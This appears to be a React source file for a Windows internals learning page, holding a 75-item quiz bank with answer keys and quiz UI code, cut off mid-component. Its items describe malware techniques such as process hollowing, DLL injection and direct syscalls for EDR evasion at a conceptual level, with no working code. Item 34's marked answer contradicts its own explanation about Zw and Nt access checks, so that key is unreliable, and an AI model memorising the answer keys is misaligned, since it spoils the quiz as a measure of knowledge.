import React, { useState, useEffect } from "react";
import {
  Box,
  Typography,
  Container,
  Paper,
  Alert,
  AlertTitle,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  Card,
  CardContent,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Chip,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  IconButton,
  Tooltip,
  Divider,
  alpha,
  useTheme,
  Button,
  Drawer,
  Fab,
  LinearProgress,
  useMediaQuery,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import MemoryIcon from "@mui/icons-material/Memory";
import SecurityIcon from "@mui/icons-material/Security";
import CodeIcon from "@mui/icons-material/Code";
import BugReportIcon from "@mui/icons-material/BugReport";
import StorageIcon from "@mui/icons-material/Storage";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import SettingsIcon from "@mui/icons-material/Settings";
import LayersIcon from "@mui/icons-material/Layers";
import TerminalIcon from "@mui/icons-material/Terminal";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import FolderIcon from "@mui/icons-material/Folder";
import AppsIcon from "@mui/icons-material/Apps";
import LockIcon from "@mui/icons-material/Lock";
import SpeedIcon from "@mui/icons-material/Speed";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import BuildIcon from "@mui/icons-material/Build";
import QuizIcon from "@mui/icons-material/Quiz";
import EmojiEventsIcon from "@mui/icons-material/EmojiEvents";
import RefreshIcon from "@mui/icons-material/Refresh";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import LearnPageLayout from "../components/LearnPageLayout";

// Question bank for Windows Internals quiz (75 questions)
interface QuizQuestion {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  topic: string;
}

const questionBank: QuizQuestion[] = [
  // Section 1: PE File Format (10 questions)
  {
    id: 1,
    question: "What does PE stand for in Windows executables?",
    options: ["Program Executable", "Portable Executable", "Process Executable", "Primary Executable"],
    correctAnswer: 1,
    explanation: "PE stands for Portable Executable, the file format for executables on Windows.",
    topic: "PE File Format"
  },
  {
    id: 2,
    question: "What is the magic number at the start of a PE file's DOS header?",
    options: ["PE\\0\\0", "MZ", "ELF", "PK"],
    correctAnswer: 1,
    explanation: "MZ (0x5A4D) is the magic number at the start of all PE files, named after Mark Zbikowski.",
    topic: "PE File Format"
  },
  {
    id: 3,
    question: "Which PE section typically contains executable code?",
    options: [".data", ".text", ".rsrc", ".reloc"],
    correctAnswer: 1,
    explanation: "The .text section contains the executable code (machine instructions).",
    topic: "PE File Format"
  },
  {
    id: 4,
    question: "What is the purpose of the .reloc section?",
    options: ["Store resources", "Hold base relocation data for ASLR", "Store read-only data", "Hold import tables"],
    correctAnswer: 1,
    explanation: "The .reloc section contains base relocation data needed when the image loads at a different address (ASLR).",
    topic: "PE File Format"
  },
  {
    id: 5,
    question: "Where are imported DLL functions listed in a PE file?",
    options: ["Export Table", "Import Address Table (IAT)", ".text section", "DOS Header"],
    correctAnswer: 1,
    explanation: "The Import Address Table (IAT) contains pointers to functions imported from DLLs.",
    topic: "PE File Format"
  },
  {
    id: 6,
    question: "What does the AddressOfEntryPoint field specify?",
    options: ["The file size", "The RVA where execution begins", "The import count", "The section alignment"],
    correctAnswer: 1,
    explanation: "AddressOfEntryPoint is the Relative Virtual Address (RVA) where program execution starts.",
    topic: "PE File Format"
  },
  {
    id: 7,
    question: "What is an RVA (Relative Virtual Address)?",
    options: ["An absolute memory address", "An offset relative to the image base when loaded in memory", "A file offset", "A section index"],
    correctAnswer: 1,
    explanation: "RVA is an address relative to where the image is loaded in memory (ImageBase + RVA = VA).",
    topic: "PE File Format"
  },
  {
    id: 8,
    question: "Which section contains embedded resources like icons and version info?",
    options: [".text", ".data", ".rsrc", ".rdata"],
    correctAnswer: 2,
    explanation: "The .rsrc section contains resources such as icons, dialogs, strings, and version information.",
    topic: "PE File Format"
  },
  {
    id: 9,
    question: "What is the difference between .data and .rdata sections?",
    options: ["No difference", ".data is read-write, .rdata is read-only", ".data is code, .rdata is data", ".data is larger"],
    correctAnswer: 1,
    explanation: ".data contains initialized read-write data, while .rdata contains read-only data like constants and imports.",
    topic: "PE File Format"
  },
  {
    id: 10,
    question: "What tool can you use to view PE headers on Windows?",
    options: ["notepad", "PE-bear, CFF Explorer, or dumpbin", "Task Manager", "Registry Editor"],
    correctAnswer: 1,
    explanation: "Tools like PE-bear, CFF Explorer, and dumpbin are designed for viewing and analyzing PE file structures.",
    topic: "PE File Format"
  },

  // Section 2: PEB & TEB (10 questions)
  {
    id: 11,
    question: "What does PEB stand for?",
    options: ["Program Execution Block", "Process Environment Block", "Primary Entry Block", "Process Entry Base"],
    correctAnswer: 1,
    explanation: "PEB stands for Process Environment Block, a structure containing process-wide information.",
    topic: "PEB & TEB"
  },
  {
    id: 12,
    question: "What does TEB stand for?",
    options: ["Thread Entry Block", "Thread Environment Block", "Task Execution Block", "Thread Execution Base"],
    correctAnswer: 1,
    explanation: "TEB stands for Thread Environment Block, containing per-thread information.",
    topic: "PEB & TEB"
  },
  {
    id: 13,
    question: "How can you access the PEB from a running process?",
    options: ["Through the registry", "Via the TEB's ProcessEnvironmentBlock pointer", "Reading a file", "Using Task Manager"],
    correctAnswer: 1,
    explanation: "The TEB contains a pointer to the PEB at offset 0x60 (x64) or 0x30 (x86).",
    topic: "PEB & TEB"
  },
  {
    id: 14,
    question: "Which PEB field is commonly checked for anti-debugging?",
    options: ["ImageBaseAddress", "BeingDebugged", "ProcessParameters", "Ldr"],
    correctAnswer: 1,
    explanation: "PEB.BeingDebugged is set to 1 when a debugger is attached, commonly checked in anti-debug code.",
    topic: "PEB & TEB"
  },
  {
    id: 15,
    question: "What does the NtGlobalFlag in PEB indicate?",
    options: ["Process priority", "Debug heap flags that indicate debugging", "Thread count", "Memory usage"],
    correctAnswer: 1,
    explanation: "NtGlobalFlag contains debug-related flags (like FLG_HEAP_*) that differ when being debugged.",
    topic: "PEB & TEB"
  },
  {
    id: 16,
    question: "What structure does PEB.Ldr point to?",
    options: ["Thread list", "PEB_LDR_DATA containing loaded modules list", "Heap structure", "Environment variables"],
    correctAnswer: 1,
    explanation: "PEB.Ldr points to PEB_LDR_DATA which contains three linked lists of loaded modules (DLLs).",
    topic: "PEB & TEB"
  },
  {
    id: 17,
    question: "How can malware hide a DLL from the PEB.Ldr module list?",
    options: ["Deleting the DLL file", "Unlinking the module entry from the linked lists", "Renaming the DLL", "Changing permissions"],
    correctAnswer: 1,
    explanation: "Malware can unlink a module from the InLoadOrderModuleList, InMemoryOrderModuleList, and InInitializationOrderModuleList.",
    topic: "PEB & TEB"
  },
  {
    id: 18,
    question: "On x64, which segment register points to the TEB?",
    options: ["FS", "GS", "ES", "DS"],
    correctAnswer: 1,
    explanation: "On x64 Windows, GS:[0] points to the TEB. On x86, FS:[0] points to the TEB.",
    topic: "PEB & TEB"
  },
  {
    id: 19,
    question: "What information does the TEB's StackBase and StackLimit contain?",
    options: ["Heap addresses", "The boundaries of the thread's stack", "Code section addresses", "DLL addresses"],
    correctAnswer: 1,
    explanation: "StackBase and StackLimit define the upper and lower bounds of the thread's stack memory.",
    topic: "PEB & TEB"
  },
  {
    id: 20,
    question: "What is stored in TEB.LastErrorValue?",
    options: ["System time", "The last Win32 error code (GetLastError value)", "Thread ID", "Process ID"],
    correctAnswer: 1,
    explanation: "TEB.LastErrorValue stores the value returned by GetLastError() for the current thread.",
    topic: "PEB & TEB"
  },

  // Section 3: Windows Memory (8 questions)
  {
    id: 21,
    question: "What is the user-mode address space limit on 32-bit Windows by default?",
    options: ["1 GB", "2 GB", "3 GB", "4 GB"],
    correctAnswer: 1,
    explanation: "By default, 32-bit Windows gives 2GB to user mode and 2GB to kernel mode.",
    topic: "Windows Memory"
  },
  {
    id: 22,
    question: "What Windows API allocates virtual memory?",
    options: ["malloc", "VirtualAlloc", "HeapAlloc", "GlobalAlloc"],
    correctAnswer: 1,
    explanation: "VirtualAlloc reserves, commits, or changes the state of virtual memory pages.",
    topic: "Windows Memory"
  },
  {
    id: 23,
    question: "What memory protection constant allows execute and read access?",
    options: ["PAGE_READONLY", "PAGE_EXECUTE_READ", "PAGE_READWRITE", "PAGE_NOACCESS"],
    correctAnswer: 1,
    explanation: "PAGE_EXECUTE_READ (0x20) allows the memory to be executed and read.",
    topic: "Windows Memory"
  },
  {
    id: 24,
    question: "What is DEP (Data Execution Prevention)?",
    options: ["A firewall feature", "A security feature that prevents code execution from data pages", "A memory compression technique", "A disk encryption system"],
    correctAnswer: 1,
    explanation: "DEP marks memory regions as non-executable, preventing shellcode execution from data areas.",
    topic: "Windows Memory"
  },
  {
    id: 25,
    question: "What is ASLR (Address Space Layout Randomization)?",
    options: ["A memory leak detector", "A security feature that randomizes memory addresses", "A heap optimization", "A debugging tool"],
    correctAnswer: 1,
    explanation: "ASLR randomizes the base addresses of executables, DLLs, stack, and heap to prevent exploitation.",
    topic: "Windows Memory"
  },
  {
    id: 26,
    question: "What does VirtualProtect do?",
    options: ["Encrypts memory", "Changes the protection attributes of memory pages", "Allocates memory", "Frees memory"],
    correctAnswer: 1,
    explanation: "VirtualProtect changes the access protection (read, write, execute) of memory pages.",
    topic: "Windows Memory"
  },
  {
    id: 27,
    question: "What is a memory-mapped file?",
    options: ["A compressed file", "A file mapped directly into the process's address space", "An encrypted file", "A temporary file"],
    correctAnswer: 1,
    explanation: "Memory-mapped files allow file contents to be accessed as if they were in memory, using virtual memory.",
    topic: "Windows Memory"
  },
  {
    id: 28,
    question: "What is the Windows heap used for?",
    options: ["Only stack allocations", "Dynamic memory allocations smaller than a page", "Code execution only", "File storage"],
    correctAnswer: 1,
    explanation: "The heap is used for dynamic memory allocations, typically smaller blocks managed by the heap manager.",
    topic: "Windows Memory"
  },

  // Section 4: System Calls & Native API (8 questions)
  {
    id: 29,
    question: "What is ntdll.dll?",
    options: ["A user interface DLL", "The lowest user-mode DLL that interfaces with the kernel", "A network DLL", "A graphics DLL"],
    correctAnswer: 1,
    explanation: "ntdll.dll contains the native API functions that transition to kernel mode via system calls.",
    topic: "System Calls & Native API"
  },
  {
    id: 30,
    question: "What prefix do native API functions typically have?",
    options: ["Win", "Nt or Zw", "Sys", "Kernel"],
    correctAnswer: 1,
    explanation: "Native API functions are prefixed with Nt (user mode origin) or Zw (kernel mode origin).",
    topic: "System Calls & Native API"
  },
  {
    id: 31,
    question: "What instruction transitions from user mode to kernel mode on x64?",
    options: ["INT 0x80", "syscall", "sysenter", "CALL"],
    correctAnswer: 1,
    explanation: "On x64 Windows, the syscall instruction performs the transition to kernel mode.",
    topic: "System Calls & Native API"
  },
  {
    id: 32,
    question: "What is the System Service Descriptor Table (SSDT)?",
    options: ["A file table", "A kernel table containing pointers to system call handlers", "A network table", "A user table"],
    correctAnswer: 1,
    explanation: "The SSDT is a kernel structure containing pointers to native system call handler functions.",
    topic: "System Calls & Native API"
  },
  {
    id: 33,
    question: "What is direct system call invocation?",
    options: ["Calling Win32 API", "Calling Nt* functions directly, bypassing kernel32/user32 hooks", "Using the command line", "Remote procedure calls"],
    correctAnswer: 1,
    explanation: "Direct syscalls bypass higher-level APIs and hooks by calling Nt* functions or using raw syscall instructions.",
    topic: "System Calls & Native API"
  },
  {
    id: 34,
    question: "What is the difference between Nt and Zw function prefixes?",
    options: ["No difference", "Zw functions perform additional access checks when called from kernel mode", "Nt functions are faster", "Zw functions are deprecated"],
    correctAnswer: 1,
    explanation: "Zw functions set the previous mode to kernel mode, bypassing access checks; Nt functions preserve the previous mode.",
    topic: "System Calls & Native API"
  },
  {
    id: 35,
    question: "What does NtQuerySystemInformation retrieve?",
    options: ["User preferences", "Various system information (processes, handles, etc.)", "Network status", "Disk space"],
    correctAnswer: 1,
    explanation: "NtQuerySystemInformation retrieves various system info like process lists, handle tables, and system stats.",
    topic: "System Calls & Native API"
  },
  {
    id: 36,
    question: "Why might malware use direct syscalls?",
    options: ["For better performance", "To bypass API hooks placed by security software", "To use less memory", "For compatibility"],
    correctAnswer: 1,
    explanation: "Direct syscalls bypass user-mode API hooks, helping malware evade EDR and antivirus detection.",
    topic: "System Calls & Native API"
  },

  // Section 5: Processes & Threads (8 questions)
  {
    id: 37,
    question: "What Windows API creates a new process?",
    options: ["CreateThread", "CreateProcess", "NtCreateProcess", "fork"],
    correctAnswer: 1,
    explanation: "CreateProcess (and CreateProcessEx) creates a new process and its primary thread.",
    topic: "Processes & Threads"
  },
  {
    id: 38,
    question: "What is a handle in Windows?",
    options: ["A file path", "An opaque reference to a kernel object", "A memory address", "A thread ID"],
    correctAnswer: 1,
    explanation: "A handle is an integer that references a kernel object like a file, process, or thread.",
    topic: "Processes & Threads"
  },
  {
    id: 39,
    question: "What does OpenProcess with PROCESS_ALL_ACCESS allow?",
    options: ["Read-only access", "Full access to perform any operation on the process", "Network access only", "File access only"],
    correctAnswer: 1,
    explanation: "PROCESS_ALL_ACCESS grants full permissions to the process including reading, writing memory, and termination.",
    topic: "Processes & Threads"
  },
  {
    id: 40,
    question: "What is process hollowing?",
    options: ["Deleting a process", "Creating a suspended process and replacing its code with malicious code", "Compressing a process", "Debugging a process"],
    correctAnswer: 1,
    explanation: "Process hollowing creates a legitimate process in suspended state, unmaps its code, and injects malicious code.",
    topic: "Processes & Threads"
  },
  {
    id: 41,
    question: "What is a Remote Thread?",
    options: ["A network connection", "A thread created in another process's address space", "A background thread", "A kernel thread"],
    correctAnswer: 1,
    explanation: "CreateRemoteThread creates a thread in another process, commonly used for DLL injection.",
    topic: "Processes & Threads"
  },
  {
    id: 42,
    question: "What is the APC (Asynchronous Procedure Call) queue?",
    options: ["A message queue", "A per-thread queue of functions to be executed", "A network queue", "A print queue"],
    correctAnswer: 1,
    explanation: "APCs are functions queued to execute in the context of a specific thread, used in some injection techniques.",
    topic: "Processes & Threads"
  },
  {
    id: 43,
    question: "What does the CREATE_SUSPENDED flag do in CreateProcess?",
    options: ["Creates a hidden process", "Creates the process with its main thread suspended", "Creates a higher priority process", "Creates a process without a window"],
    correctAnswer: 1,
    explanation: "CREATE_SUSPENDED creates the process but doesn't run it until ResumeThread is called, allowing manipulation before execution.",
    topic: "Processes & Threads"
  },
  {
    id: 44,
    question: "What is PID?",
    options: ["Program Identifier", "Process Identifier - a unique number for each process", "Primary ID", "Parent ID"],
    correctAnswer: 1,
    explanation: "PID (Process Identifier) is a unique number assigned to each running process.",
    topic: "Processes & Threads"
  },

  // Section 6: DLLs & Injection (8 questions)
  {
    id: 45,
    question: "What does DLL stand for?",
    options: ["Data Link Library", "Dynamic Link Library", "Direct Load Library", "Distributed Link Library"],
    correctAnswer: 1,
    explanation: "DLL stands for Dynamic Link Library, containing code and data shared between programs.",
    topic: "DLLs & Injection"
  },
  {
    id: 46,
    question: "What is DLL injection?",
    options: ["Installing a DLL", "Forcing a process to load an attacker-controlled DLL", "Compiling a DLL", "Signing a DLL"],
    correctAnswer: 1,
    explanation: "DLL injection forces a target process to load a DLL, allowing code execution in that process's context.",
    topic: "DLLs & Injection"
  },
  {
    id: 47,
    question: "Which function is commonly used for classic DLL injection?",
    options: ["LoadLibrary", "CreateRemoteThread with LoadLibraryA", "FreeLibrary", "GetModuleHandle"],
    correctAnswer: 1,
    explanation: "Classic DLL injection uses CreateRemoteThread to call LoadLibraryA in the target process.",
    topic: "DLLs & Injection"
  },
  {
    id: 48,
    question: "What is reflective DLL injection?",
    options: ["Loading from disk", "Loading a DLL from memory without using LoadLibrary", "Loading a signed DLL", "Loading a system DLL"],
    correctAnswer: 1,
    explanation: "Reflective DLL injection loads a DLL entirely from memory, avoiding disk writes and LoadLibrary.",
    topic: "DLLs & Injection"
  },
  {
    id: 49,
    question: "What is DLL search order hijacking?",
    options: ["Renaming a DLL", "Placing a malicious DLL in a location searched before the legitimate one", "Deleting DLLs", "Compressing DLLs"],
    correctAnswer: 1,
    explanation: "DLL hijacking exploits the search order by placing a malicious DLL where it's found first.",
    topic: "DLLs & Injection"
  },
  {
    id: 50,
    question: "What does DllMain's DLL_PROCESS_ATTACH reason indicate?",
    options: ["DLL is being unloaded", "DLL is being loaded into a process", "A thread is starting", "A thread is ending"],
    correctAnswer: 1,
    explanation: "DLL_PROCESS_ATTACH is called when the DLL is first loaded into a process's address space.",
    topic: "DLLs & Injection"
  },
  {
    id: 51,
    question: "What is module stomping?",
    options: ["Deleting modules", "Overwriting a legitimately loaded DLL's code with malicious code", "Compressing modules", "Signing modules"],
    correctAnswer: 1,
    explanation: "Module stomping overwrites the code section of a legitimately loaded DLL to hide malicious code.",
    topic: "DLLs & Injection"
  },
  {
    id: 52,
    question: "What does GetProcAddress do?",
    options: ["Gets a process handle", "Retrieves the address of an exported function from a DLL", "Gets a thread address", "Allocates memory"],
    correctAnswer: 1,
    explanation: "GetProcAddress retrieves the memory address of a function exported by a loaded DLL.",
    topic: "DLLs & Injection"
  },

  // Section 7: Registry & Persistence (7 questions)
  {
    id: 53,
    question: "What is a common persistence location in the registry?",
    options: ["HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKEY_LOCAL_MACHINE\\HARDWARE", "HKEY_USERS\\.DEFAULT"],
    correctAnswer: 1,
    explanation: "The Run key automatically executes programs at user logon, making it a common persistence location.",
    topic: "Registry & Persistence"
  },
  {
    id: 54,
    question: "What is HKLM short for?",
    options: ["Host Key Local Machine", "HKEY_LOCAL_MACHINE", "Hardware Key LM", "Host Kernel Local Manager"],
    correctAnswer: 1,
    explanation: "HKLM is the abbreviation for HKEY_LOCAL_MACHINE, containing system-wide settings.",
    topic: "Registry & Persistence"
  },
  {
    id: 55,
    question: "What is the difference between HKCU and HKLM Run keys?",
    options: ["No difference", "HKCU is per-user, HKLM is system-wide (requires admin)", "HKCU requires admin", "HKLM is per-user"],
    correctAnswer: 1,
    explanation: "HKCU\\...\\Run runs for the current user; HKLM\\...\\Run runs for all users but requires admin to modify.",
    topic: "Registry & Persistence"
  },
  {
    id: 56,
    question: "What is a Scheduled Task used for in persistence?",
    options: ["Only for backups", "Running programs at specific times or events, surviving reboots", "Only for updates", "Only for cleanup"],
    correctAnswer: 1,
    explanation: "Scheduled tasks can run programs at login, startup, or schedules, providing robust persistence.",
    topic: "Registry & Persistence"
  },
  {
    id: 57,
    question: "What is a Windows Service?",
    options: ["A web service", "A background process that runs without user interaction", "A customer service feature", "A cloud service"],
    correctAnswer: 1,
    explanation: "Windows services are long-running executables that perform system functions, often starting at boot.",
    topic: "Registry & Persistence"
  },
  {
    id: 58,
    question: "Where are service configurations stored?",
    options: ["In a file", "HKLM\\SYSTEM\\CurrentControlSet\\Services", "In the user profile", "In Program Files"],
    correctAnswer: 1,
    explanation: "Service configurations are stored in the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services.",
    topic: "Registry & Persistence"
  },
  {
    id: 59,
    question: "What is WMI persistence?",
    options: ["A file-based persistence", "Using WMI event subscriptions to trigger malicious actions", "A network persistence", "A temporary persistence"],
    correctAnswer: 1,
    explanation: "WMI persistence uses permanent event subscriptions to trigger malicious code on system events.",
    topic: "Registry & Persistence"
  },

  // Section 8: Windows Security (8 questions)
  {
    id: 60,
    question: "What is a Security Descriptor?",
    options: ["A file name", "A structure that contains security info (owner, ACL) for an object", "A password", "A network address"],
    correctAnswer: 1,
    explanation: "Security descriptors contain the owner, group, and Access Control Lists (ACLs) for securable objects.",
    topic: "Windows Security"
  },
  {
    id: 61,
    question: "What does ACL stand for?",
    options: ["Access Control Layer", "Access Control List", "Advanced Control Logic", "Authorization Control List"],
    correctAnswer: 1,
    explanation: "ACL (Access Control List) is a list of Access Control Entries (ACEs) defining who can access an object.",
    topic: "Windows Security"
  },
  {
    id: 62,
    question: "What is an access token?",
    options: ["A password", "An object representing the security context of a process or thread", "A network key", "A file permission"],
    correctAnswer: 1,
    explanation: "Access tokens contain the security identity, privileges, and group memberships for a process or thread.",
    topic: "Windows Security"
  },
  {
    id: 63,
    question: "What is UAC (User Account Control)?",
    options: ["A login system", "A security feature that prompts for elevation when admin rights are needed", "A firewall", "A backup system"],
    correctAnswer: 1,
    explanation: "UAC prompts users before allowing programs to make changes requiring administrator privileges.",
    topic: "Windows Security"
  },
  {
    id: 64,
    question: "What is privilege escalation?",
    options: ["Logging in", "Gaining higher privileges than originally granted", "Installing software", "Network access"],
    correctAnswer: 1,
    explanation: "Privilege escalation is gaining elevated access (e.g., from standard user to admin or SYSTEM).",
    topic: "Windows Security"
  },
  {
    id: 65,
    question: "What privileges does the SYSTEM account have?",
    options: ["Limited privileges", "Full unrestricted access to the local system", "Network only access", "Read-only access"],
    correctAnswer: 1,
    explanation: "SYSTEM (LocalSystem) has complete control over the local machine, higher than Administrator.",
    topic: "Windows Security"
  },
  {
    id: 66,
    question: "What is CFG (Control Flow Guard)?",
    options: ["A firewall", "A security feature that validates indirect call targets", "A password manager", "A disk encryption"],
    correctAnswer: 1,
    explanation: "CFG validates that indirect call targets are valid, preventing many control-flow hijack exploits.",
    topic: "Windows Security"
  },
  {
    id: 67,
    question: "What is Credential Guard?",
    options: ["A password manager", "Virtualization-based security that isolates credentials from the OS", "A firewall rule", "An antivirus feature"],
    correctAnswer: 1,
    explanation: "Credential Guard uses VBS to isolate secrets like NTLM hashes in a separate virtualized environment.",
    topic: "Windows Security"
  },

  // Section 9: Debugging & Analysis Tools (8 questions)
  {
    id: 68,
    question: "What is WinDbg?",
    options: ["A text editor", "Microsoft's debugger for Windows user-mode and kernel-mode debugging", "A file manager", "A network tool"],
    correctAnswer: 1,
    explanation: "WinDbg is Microsoft's powerful debugger for debugging Windows applications and the kernel.",
    topic: "Debugging & Analysis"
  },
  {
    id: 69,
    question: "What command shows the call stack in WinDbg?",
    options: ["list", "k or kb", "stack", "show"],
    correctAnswer: 1,
    explanation: "The 'k' command (and variants like kb, kv, kp) display the call stack.",
    topic: "Debugging & Analysis"
  },
  {
    id: 70,
    question: "What is Process Monitor (Procmon) used for?",
    options: ["Only CPU monitoring", "Real-time monitoring of file, registry, network, and process activity", "Only memory monitoring", "Only network monitoring"],
    correctAnswer: 1,
    explanation: "Procmon monitors real-time file system, registry, network, and process/thread activity.",
    topic: "Debugging & Analysis"
  },
  {
    id: 71,
    question: "What does Process Explorer show that Task Manager doesn't?",
    options: ["Nothing extra", "DLL list, handles, detailed process tree, parent relationships", "CPU usage", "Memory usage"],
    correctAnswer: 1,
    explanation: "Process Explorer shows loaded DLLs, handles, parent process info, and much more detail than Task Manager.",
    topic: "Debugging & Analysis"
  },
  {
    id: 72,
    question: "What is x64dbg?",
    options: ["A hex editor", "An open-source x64/x32 debugger for Windows", "A compiler", "A disassembler only"],
    correctAnswer: 1,
    explanation: "x64dbg is a popular open-source debugger for Windows, supporting both 32-bit and 64-bit applications.",
    topic: "Debugging & Analysis"
  },
  {
    id: 73,
    question: "What does the !peb command do in WinDbg?",
    options: ["Prints error buffer", "Displays the Process Environment Block", "Pauses execution", "Prints entry breakpoints"],
    correctAnswer: 1,
    explanation: "!peb displays the contents of the current process's Process Environment Block.",
    topic: "Debugging & Analysis"
  },
  {
    id: 74,
    question: "What is API Monitor used for?",
    options: ["Network monitoring", "Monitoring and controlling API calls made by applications", "CPU monitoring", "Disk monitoring"],
    correctAnswer: 1,
    explanation: "API Monitor captures API calls, showing parameters and return values for application analysis.",
    topic: "Debugging & Analysis"
  },
  {
    id: 75,
    question: "What does the lm command do in WinDbg?",
    options: ["Lists memory", "Lists loaded modules", "Lists mutexes", "Lists messages"],
    correctAnswer: 1,
    explanation: "The 'lm' command lists all modules (DLLs) loaded in the current process or kernel.",
    topic: "Debugging & Analysis"
  }
];

// Quiz Section Component
function QuizSection() {
  const theme = useTheme();
  const [quizStarted, setQuizStarted] = React.useState(false);
  const [currentQuestions, setCurrentQuestions] = React.useState<QuizQuestion[]>([]);
  const [userAnswers, setUserAnswers] = React.useState<{ [key: number]: number }>({});
  const [showResults, setShowResults] = React.useState(false);
  const [currentQuestionIndex, setCurrentQuestionIndex] = React.useState(0);

  const shuffleAndSelectQuestions = () => {
    const shuffled = [...questionBank].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, 10);
  };

  const startQuiz = () => {
    setCurrentQuestions(shuffleAndSelectQuestions());
    setUserAnswers({});
    setShowResults(false);
    setCurrentQuestionIndex(0);
    setQuizStarted(true);
  };

  const handleAnswerSelect = (questionId: number, answerIndex: number) => {
    setUserAnswers((prev) => ({ ...prev, [questionId]: answerIndex }));
  };

  const calculateScore = () => {
    let correct = 0;
    currentQuestions.forEach((q) => {
      if (userAnswers[q.id] === q.correctAnswer) correct++;
    });
    return correct;
  };

  const getScoreColor = (score: number) => {
    if (score >= 8) return "#22c55e";
    if (score >= 6) return "#f97316";
    return "#ef4444";
  };

  const getScoreMessage = (score: number) => {
    if (score === 10) return "Perfect! You're a Windows internals expert! 🏆";
    if (score >= 8) return "Excellent work! Strong Windows knowledge! 🌟";
    if (score >= 6) return "Good job! Keep studying Windows internals! 📚";
    if (score >= 4) return "Not bad, but review the material again. 💪";
    return "Keep learning! Review the sections above. 📖";
  };

  if (!quizStarted) {
    return (
      <Paper
        id="quiz-section"
        sx={{
          p: 4,
          mb: 5,
          borderRadius: 4,
          bgcolor: alpha(theme.palette.background.paper, 0.6),
          border: `2px solid ${alpha("#3b82f6", 0.3)}`,
          background: `linear-gradient(135deg, ${alpha("#3b82f6", 0.05)} 0%, ${alpha("#2563eb", 0.05)} 100%)`,
        }}
      >
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <Box sx={{ width: 56, height: 56, borderRadius: 2, background: "linear-gradient(135deg, #3b82f6, #2563eb)", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <QuizIcon sx={{ color: "white", fontSize: 32 }} />
          </Box>
          Test Your Windows Internals Knowledge
        </Typography>

        <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8, fontSize: "1.05rem" }}>
          Ready to test what you've learned? Take this <strong>10-question quiz</strong> covering Windows internals 
          for reverse engineering. Questions are randomly selected from a pool of <strong>75 questions</strong>!
        </Typography>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#3b82f6", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#3b82f6" }}>10</Typography>
              <Typography variant="caption" color="text.secondary">Questions</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#22c55e", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#22c55e" }}>75</Typography>
              <Typography variant="caption" color="text.secondary">Question Pool</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#8b5cf6", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#8b5cf6" }}>9</Typography>
              <Typography variant="caption" color="text.secondary">Topics Covered</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#f97316", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#f97316" }}>∞</Typography>
              <Typography variant="caption" color="text.secondary">Retakes Allowed</Typography>
            </Paper>
          </Grid>
        </Grid>

        <Button
          variant="contained"
          size="large"
          onClick={startQuiz}
          startIcon={<QuizIcon />}
          sx={{ background: "linear-gradient(135deg, #3b82f6, #2563eb)", fontWeight: 700, px: 4, py: 1.5, fontSize: "1.1rem", "&:hover": { background: "linear-gradient(135deg, #2563eb, #1d4ed8)" } }}
        >
          Start Quiz
        </Button>
      </Paper>
    );
  }

  if (showResults) {
    const score = calculateScore();
    return (
      <Paper id="quiz-section" sx={{ p: 4, mb: 5, borderRadius: 4, bgcolor: alpha(theme.palette.background.paper, 0.6), border: `2px solid ${alpha(getScoreColor(score), 0.3)}` }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <EmojiEventsIcon sx={{ color: getScoreColor(score), fontSize: 40 }} />
          Quiz Results
        </Typography>

        <Box sx={{ textAlign: "center", mb: 4 }}>
          <Typography variant="h1" sx={{ fontWeight: 900, color: getScoreColor(score), mb: 1 }}>{score}/10</Typography>
          <Typography variant="h6" sx={{ color: "text.secondary", mb: 2 }}>{getScoreMessage(score)}</Typography>
          <Chip label={`${score * 10}%`} sx={{ bgcolor: alpha(getScoreColor(score), 0.15), color: getScoreColor(score), fontWeight: 700, fontSize: "1rem", px: 2 }} />
        </Box>

        <Divider sx={{ my: 3 }} />
        <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Review Your Answers:</Typography>

        {currentQuestions.map((q, index) => {
          const isCorrect = userAnswers[q.id] === q.correctAnswer;
          return (
            <Paper key={q.id} sx={{ p: 2, mb: 2, borderRadius: 2, bgcolor: alpha(isCorrect ? "#22c55e" : "#ef4444", 0.05), border: `1px solid ${alpha(isCorrect ? "#22c55e" : "#ef4444", 0.2)}` }}>
              <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1, mb: 1 }}>
